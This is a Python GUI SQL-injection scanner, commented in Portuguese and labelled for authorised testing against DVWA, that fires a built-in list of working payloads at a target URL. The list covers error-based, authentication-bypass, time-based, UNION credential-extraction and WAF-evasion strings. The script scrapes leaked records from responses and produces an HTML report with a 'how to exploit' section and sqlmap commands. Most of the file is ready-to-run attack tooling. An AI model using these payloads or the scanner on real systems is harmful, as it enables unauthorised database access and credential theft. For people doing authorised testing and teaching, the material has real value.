#!/usr/bin/env python3
# SQLi Scanner GUI - Testes autorizados (DVWA e similares)
# pip install requests
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext
import requests, urllib.parse, re, threading, webbrowser, html, time, datetime

# ===== PAYLOADS =====
PAYLOADS = [
    # Error-based
    ("'", "Erro SQL clássico"),
    ("1'", "Erro de sintaxe após número"),
    ("1' AND extractvalue(1, concat(0x7e, version()))-- ", "Error-based MySQL extractvalue"),
    ("1' AND updatexml(1, concat(0x7e, version()), 1)-- ", "Error-based MySQL updatexml"),
    ("1' AND 1=CONVERT(int, @@version)-- ", "Error-based MSSQL"),
    # Auth bypass / boolean
    ("' OR '1'='1", "Bypass clássico string"),
    ("1' OR '1'='1", "Bypass de autenticação (OR 1=1)"),
    ("1 OR 1=1", "Bypass numérico"),
    ("1' OR '1'='1' -- ", "Bypass com comentário"),
    ("' OR 1=1#", "Bypass hash comment"),
    ("admin'-- ", "Login bypass admin"),
    ("1 AND 1=1", "Booleano TRUE (baseline)"),
    ("1 AND 1=2", "Booleano FALSE"),
    ("1' AND '1'='1", "Booleano string TRUE"),
    ("1' AND '1'='2", "Booleano string FALSE"),
    # Time-based
    ("1' AND SLEEP(5)-- ", "Time-based MySQL"),
    ("1 AND SLEEP(5)", "Time-based MySQL numérico"),
    ("1'; WAITFOR DELAY '0:0:5'-- ", "Time-based MSSQL"),
    ("1' AND pg_sleep(5)-- ", "Time-based PostgreSQL"),
    ("1' AND BENCHMARK(5000000, SHA1('t'))-- ", "Time-based BENCHMARK"),
    # UNION
    ("1 UNION SELECT NULL-- ", "UNION 1 coluna"),
    ("1 UNION SELECT NULL,NULL-- ", "UNION 2 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL-- ", "UNION 3 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL-- ", "UNION 4 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "UNION 5 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "UNION 6 colunas"),
    ("1' UNION SELECT NULL,NULL-- ", "UNION string 2 colunas"),
    ("1' UNION SELECT NULL,NULL,NULL-- ", "UNION string 3 colunas"),
    ("1' UNION SELECT version(),database()-- ", "UNION extraindo versão/banco"),
    ("1' UNION SELECT table_name,NULL FROM information_schema.tables-- ", "UNION listando tabelas"),
    ("1' UNION SELECT user,password FROM users-- ", "UNION extraindo credenciais (DVWA)"),
    ("1' UNION SELECT @@version,@@datadir-- ", "UNION MSSQL/MySQL info"),
    # WAF bypass
    ("1/**/OR/**/1=1", "Inline comments"),
    ("1 /*!50000OR*/ 1=1", "MySQL version comment"),
    ("1 OR 0x31=0x31", "Hex encoding"),
    ("1 %00OR 1=1", "Null byte"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "mysql_fetch", "pg_query",
    "sqlite3.operationalerror", "ora-01756", "microsoft ole db provider",
    "odbc sql server driver", "syntax error", "unterminated string",
    "sqlsyntaxerrorexception", "error in your sql",
]

TIME_LIMIT = 10
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (SQLi-Scanner-GUI; Auth-Test)"


def extract_leaked_data(body):
    """Extrai dados vazados da resposta (padrão DVWA e tabelas HTML genéricas)."""
    data = []
    # Padrão DVWA: ID: ... / First name: ... / Surname: ...
    ids = re.findall(r"ID:\s*(.*?)<br", body) or re.findall(r"ID:\s*([^\n<]+)", body)
    firsts = re.findall(r"First name:\s*(.*?)<br", body) or re.findall(r"First name:\s*([^\n<]+)", body)
    surnames = re.findall(r"Surname:\s*(.*?)<br", body) or re.findall(r"Surname:\s*([^\n<]+)", body)
    n = max(len(ids), len(firsts), len(surnames))
    if n:
        for i in range(n):
            f = firsts[i].strip() if i < len(firsts) else ""
            s = surnames[i].strip() if i < len(surnames) else ""
            data.append(f"{f} {s}".strip())
        return data
    # Genérico: linhas de <tr><td>...</td></tr>
    rows = re.findall(r"<tr>\s*<td>(.*?)</td>\s*<td>(.*?)</td>", body, re.S)
    for a, b in rows[:20]:
        clean = lambda x: re.sub(r"<.*?>", "", x).strip()
        data.append(f"{clean(a)} | {clean(b)}")
    return data


class App:
    def __init__(self, root):
        root.title("SQLi Scanner - Testes Autorizados")
        root.geometry("980x700")
        frm = ttk.Frame(root, padding=10)
        frm.pack(fill="both", expand=True)
        frm.columnconfigure(1, weight=1)
        frm.rowconfigure(3, weight=1)

        ttk.Label(frm, text="URL alvo:").grid(row=0, column=0, sticky="w")
        self.url_entry = ttk.Entry(frm)
        self.url_entry.grid(row=0, column=1, padx=5, sticky="ew")
        self.url_entry.insert(0, "http://192.168.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit")

        ttk.Label(frm, text="Cookie:").grid(row=1, column=0, sticky="w")
        self.cookie_entry = ttk.Entry(frm)
        self.cookie_entry.grid(row=1, column=1, padx=5, sticky="ew")
        self.cookie_entry.insert(0, "PHPSESSID=d64572855137741f8a2ee9235030a63d; security=low")

        ttk.Label(frm, text="Parâmetros POST\n(vazio = só GET):").grid(row=2, column=0, sticky="w")
        self.post_entry = ttk.Entry(frm)
        self.post_entry.grid(row=2, column=1, padx=5, sticky="ew")
        self.post_entry.insert(0, "Submit=Submit")

        self.btn = ttk.Button(frm, text="Escanear", command=self.start)
        self.btn.grid(row=0, column=2, rowspan=2)

        self.log = scrolledtext.ScrolledText(frm, height=25)
        self.log.grid(row=3, column=0, columnspan=3, sticky="nsew", pady=10)

        ttk.Button(frm, text="Salvar relatório HTML", command=self.save).grid(row=4, column=1)
        self.results, self.findings = [], []

    def write(self, txt):
        self.log.insert("end", txt + "\n")
        self.log.see("end")

    def start(self):
        url = self.url_entry.get().strip()
        if not url:
            return
        cookies = {}
        for part in self.cookie_entry.get().split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k] = v
        session.cookies.clear()
        session.cookies.update(cookies)

        self.log.delete("1.0", "end")
        self.results, self.findings = [], []
        self.btn.config(state="disabled")
        threading.Thread(target=self.scan, args=(url,), daemon=True).start()

    def build_request(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        post_data = None
        if not qs:
            post_data = urllib.parse.parse_qs(self.post_entry.get())
            if param in post_data:
                post_data[param] = payload
                return url, post_data
            return None, None
        new_qs = dict(qs)
        new_qs[param] = payload
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_qs, doseq=True))), None

    def send(self, url, data=None):
        t0 = time.time()
        try:
            r = session.get(url, timeout=TIME_LIMIT) if data is None else session.post(url, data=data, timeout=TIME_LIMIT)
        except requests.RequestException as e:
            return None, 0, str(e)
        return r, time.time() - t0, None

    def scan(self, url):
        parsed = urllib.parse.urlparse(url)
        get_params = urllib.parse.parse_qs(parsed.query)
        post_params = urllib.parse.parse_qs(self.post_entry.get()) if self.post_entry.get().strip() else {}
        params = get_params or post_params
        self.write(f"[*] Alvo: {url}\n")
        if not params:
            self.write("[!] Nenhum parâmetro detectado.")
            self.btn.config(state="normal")
            return

        params = {k: v for k, v in params.items() if k.lower() != "submit"}

        base_r, _, _ = self.send(url, post_params if not get_params else None)
        base_len = len(base_r.text) if base_r else 0

        for param in list(params):
            true_len, false_len = None, None
            for payload, tag in (("1 AND 1=1", "TRUE"), ("1 AND 1=2", "FALSE")):
                test_url, data = self.build_request(url, param, payload)
                if not test_url:
                    continue
                r, t, err = self.send(test_url, data)
                if r:
                    if tag == "TRUE":
                        true_len = len(r.text)
                    else:
                        false_len = len(r.text)

            blind_ok = true_len is not None and false_len is not None and abs(true_len - false_len) > 20
            if blind_ok:
                self.write(f"[+] Blind confirmado em '{param}': len(TRUE)={true_len} vs len(FALSE)={false_len}")

            for payload, desc in PAYLOADS:
                test_url, data = self.build_request(url, param, payload)
                if not test_url:
                    continue
                r, t, err = self.send(test_url, data)
                if err:
                    self.write(f"[-] Erro: {err}")
                    continue

                vuln = None
                body = r.text.lower()
                for e in SQL_ERRORS:
                    if e in body:
                        vuln = f"Erro SQL visível: '{e}'"
                        break
                if not vuln and t > 5 and any(x in payload.lower() for x in ("sleep", "waitfor", "benchmark", "pg_sleep")):
                    vuln = f"Resposta atrasada {t:.1f}s (time-based)"
                if not vuln and blind_ok and ("1=1" in payload or "'1'='1" in payload):
                    if abs(len(r.text) - true_len) < 50 and "and" in payload.lower() and "1=2" not in payload:
                        vuln = f"Blind boolean: resposta idêntica à TRUE ({len(r.text)} bytes)"
                if not vuln and ("or '1'='1" in payload.lower() or "or 1=1" in payload.lower()):
                    if abs(len(r.text) - base_len) > 100:
                        vuln = f"Conteúdo alterado com OR 1=1 (base={base_len}, agora={len(r.text)} bytes)"
                if not vuln and "union select" in payload.lower() and "null,null" in payload.lower():
                    if r.status_code != base_r.status_code and base_r.status_code:
                        vuln = f"UNION alterou status ({base_r.status_code} -> {r.status_code})"
                    elif abs(len(r.text) - base_len) > 100:
                        vuln = f"UNION retornou dados extras (base={base_len}, agora={len(r.text)} bytes)"

                # ===== EXTRAÇÃO DE DADOS VAZADOS =====
                leaked = []
                if vuln or "union select version" in payload.lower() or "from users" in payload.lower() or "information_schema" in payload.lower() or "or 1=1" in payload.lower().replace("'", "'"):
                    leaked = extract_leaked_data(r.text)
                    leaked = [x for x in leaked if x and x not in ("admin admin",)] if False else leaked
                # filtra repetições do próprio payload na página
                leaked = [x for x in leaked if payload[:8] not in x or " " in x]

                if vuln:
                    self.write(f"[VULN] {param} = {payload[:38]:<70}  status={r.status_code} len={len(r.text)} t={t:.1f}s")
                    if leaked:
                        self.write(f"       >>> DADOS VAZADOS ({len(leaked)} registros):")
                        for item in leaked[:15]:
                            self.write(f"       {item}")
                        if len(leaked) > 15:
                            self.write(f"       ... e mais {len(leaked)-15} registros")
                    self.findings.append((param, payload, desc, vuln, test_url, leaked))
                else:
                    self.write(f"[ok  ] {param} = {payload[:38]:<70} status={r.status_code} len={len(r.text)} t={t:.1f}s")
                self.results.append((param, payload, r.status_code, t, bool(vuln), desc, vuln, len(r.text), leaked))
                time.sleep(0.2)

        self.write(f"\n[*] Concluído. {len(self.findings)} vulnerabilidades Encontradas")
        self.btn.config(state="normal")

    def save(self):
            f = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML", "*.html")])
            if not f:
                return
            now = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")

            # ===== Tabela de resultados =====
            rows = ""
            for param, payload, code, t, v, desc, detail, ln, leaked in self.results:
                row_bg = "#fdecea" if v else "#eaf7ea"
                badge = ("<span style='background:#d32f2f;color:#fff;padding:2px 10px;"
                        "border-radius:12px;font-weight:bold'>VULNERÁVEL</span>") if v else \
                        ("<span style='background:#2e7d32;color:#fff;padding:2px 10px;"
                        "border-radius:12px'>OK</span>")
                leak_html = ""
                if leaked:
                    items = "".join(f"<div style='padding:2px 0;border-bottom:1px dotted #ccc'>📋 {html.escape(x)}</div>"
                                    for x in leaked[:15])
                    leak_html = (f"<div style='background:#fff8e1;border:1px solid #f0c948;"
                                f"border-radius:6px;padding:6px 10px;margin-top:6px;font-size:12px'>"
                                f"<b style='color:#8a6d00'>⚠ Dados vazados:</b>{items}</div>")
                rows += (f"<tr style='background:{row_bg}'>"
                        f"<td><b>{html.escape(param)}</b></td>"
                        f"<td><code class='pay'>{html.escape(payload)}</code></td>"
                        f"<td>{html.escape(desc)}</td>"
                        f"<td style='text-align:center'>{code}</td>"
                        f"<td style='text-align:center'>{ln}</td>"
                        f"<td style='text-align:center'>{t:.1f}s</td>"
                        f"<td style='text-align:center'>{badge}</td>"
                        f"<td>{html.escape(detail or '—')}</td></tr>")

            # ===== Como explorar =====
            exp = ""
            if self.findings:
                exp = "<h2>🚀 Como explorar</h2><div class='cards'>"
                for i, (param, payload, desc, detail, test_url, leaked) in enumerate(self.findings, 1):
                    leak_block = ""
                    if leaked:
                        items = "".join(f"<li>{html.escape(x)}</li>" for x in leaked)
                        leak_block = (f"<div class='leak'><b>💾 Registros extraídos ({len(leaked)}):</b>"
                                    f"<ul style='margin:6px 0 0 0'>{items}</ul></div>")
                    exp += (f"<div class='card'><div class='card-title'>Vulnerabilidade #{i} — parâmetro "
                            f"<code>{html.escape(param)}</code></div>"
                            f"<p><b>Payload:</b> <code class='pay'>{html.escape(payload)}</code></p>"
                            f"<p><b>Evidência:</b> {html.escape(detail)}</p>"
                            f"<p><b>URL de prova:</b><br><a class='url' href='{html.escape(test_url)}'>{html.escape(test_url)}</a></p>"
                            f"<p><b>sqlmap:</b><br><code class='cmd'>sqlmap -u \"{html.escape(self.url_entry.get())}\" "
                            f"--cookie=\"{html.escape(self.cookie_entry.get())}\" -p {html.escape(param)} --batch --dbs</code></p>"
                            f"{leak_block}</div>")
                exp += "</div>"
            else:
                exp = "<h2>✅ Nenhuma vulnerabilidade confirmada</h2><p>Nenhum payload retornou evidência de SQL Injection.</p>"

            vuln_n = len(self.findings)
            total = len(self.results)
            color_n = "#d32f2f" if vuln_n else "#2e7d32"

            doc = f"""<!DOCTYPE html>
    <html lang="pt-BR"><head><meta charset="utf-8">
    <title>Relatório de SQL Injection</title>
    <style>
    * {{ box-sizing: border-box; }}
    body {{ font-family: 'Segoe UI', Arial, sans-serif; background:#f0f2f5; color:#1a1a2e; margin:0; padding:30px; }}
    .container {{ max-width:1200px; margin:0 auto; }}
    header {{ background:linear-gradient(135deg,#1a237e,#283593); color:#fff; padding:30px 35px;
            border-radius:12px; margin-bottom:25px; }}
    header h1 {{ margin:0 0 8px 0; font-size:26px; }}
    header p {{ margin:3px 0; opacity:.9; font-size:14px; }}
    .summary {{ display:flex; gap:15px; margin-bottom:25px; flex-wrap:wrap; }}
    .stat {{ flex:1; min-width:180px; background:#fff; border-radius:10px; padding:18px 22px;
            box-shadow:0 2px 6px rgba(0,0,0,.08); }}
    .stat .num {{ font-size:32px; font-weight:bold; }}
    .stat .lbl {{ font-size:13px; color:#666; margin-top:4px; }}
    h2 {{ color:#1a237e; border-bottom:3px solid #1a237e; padding-bottom:8px; margin-top:35px; }}
    table {{ border-collapse:collapse; width:100%; background:#fff; border-radius:10px; overflow:hidden;
            box-shadow:0 2px 6px rgba(0,0,0,.08); font-size:13px; }}
    th {{ background:#283593; color:#fff; padding:10px 12px; text-align:left; white-space:nowrap; }}
    td {{ border-bottom:1px solid #e0e0e0; padding:9px 12px; vertical-align:top; }}
    tr:hover td {{ background:#e8eaf6; }}
    code.pay {{ background:#eceff1; color:#c62828; padding:2px 6px; border-radius:4px;
                font-family:Consolas,monospace; word-break:break-all; font-size:12px; }}
    code.cmd {{ display:block; background:#263238; color:#80cbc4; padding:10px 14px; border-radius:6px;
                font-family:Consolas,monospace; word-break:break-all; font-size:12px; margin-top:5px; }}
    .cards {{ display:grid; grid-template-columns:repeat(auto-fill,minmax(460px,1fr)); gap:18px; }}
    .card {{ background:#fff; border-radius:10px; padding:18px 22px; box-shadow:0 2px 6px rgba(0,0,0,.08);
            border-left:5px solid #d32f2f; }}
    .card-title {{ font-weight:bold; color:#1a237e; margin-bottom:10px; font-size:15px; }}
    .card p {{ margin:8px 0; font-size:14px; }}
    a.url {{ color:#1565c0; word-break:break-all; }}
    .leak {{ background:#e8f5e9; border:1px solid #81c784; border-radius:6px; padding:10px 14px;
            margin-top:10px; font-size:13px; }}
    .leak li {{ margin:3px 0; color:#1b5e20; font-weight:500; }}
    ul.rec li {{ margin:8px 0; font-size:14px; background:#fff; padding:10px 16px; border-radius:8px;
                box-shadow:0 1px 3px rgba(0,0,0,.06); list-style:none; }}
    footer {{ text-align:center; color:#777; font-size:12px; margin-top:40px; }}
    </style></head><body><div class="container">
    <header>
    <h1>🛡 Relatório de SQL Injection</h1>
    <p><b>Alvo:</b> {html.escape(self.url_entry.get())}</p>
    <p><b>Gerado em:</b> {now} — Uso autorizado (teste de segurança)</p>
    </header>

    <div class="summary">
    <div class="stat"><div class="num" style="color:{color_n}">{vuln_n}</div><div class="lbl">Vulnerabilidades encontradas</div></div>
    <div class="stat"><div class="num">{total}</div><div class="lbl">Testes executados</div></div>
    <div class="stat"><div class="num">{sum(1 for r in self.results if r[8])}</div><div class="lbl">Com dados vazados</div></div>
    </div>

    {exp}

    <h2>📋 Detalhes de todos os testes</h2>
    <table>
    <tr><th>Parâmetro</th><th>Payload</th><th>Técnica</th><th>Status</th><th>Bytes</th><th>Tempo</th><th>Resultado</th><th>Evidência</th></tr>
    {rows}
    </table>

    <h2>🔒 Recomendações de correção</h2>
    <ul class="rec">
    <li><b>Queries parametrizadas:</b> use prepared statements (PDO no PHP, mysqli com bind_param) — nunca concatene entrada do usuário na query.</li>
    <li><b>Validação de entrada:</b> valide tipos e formatos (ex: <code>intval()</code> para IDs numéricos).</li>
    <li><b>Menor privilégio:</b> o usuário do banco não deve ter permissões de DROP/FILE/admin.</li>
    <li><b>WAF:</b> regra adicional, não substitui código seguro.</li>
    <li><b>Mensagens de erro:</b> não exiba erros SQL ao usuário (display_errors off em produção).</li>
    </ul>

    <footer>Gerado por SQLi Scanner — Somente para testes autorizados</footer>
    </div></body></html>"""
            with open(f, "w", encoding="utf-8") as fh:
                fh.write(doc)
            self.write(f"[+] Relatório salvo: {f}")
            webbrowser.open(f)


if __name__ == "__main__":
    root = tk.Tk()
    App(root)
    root.mainloop()
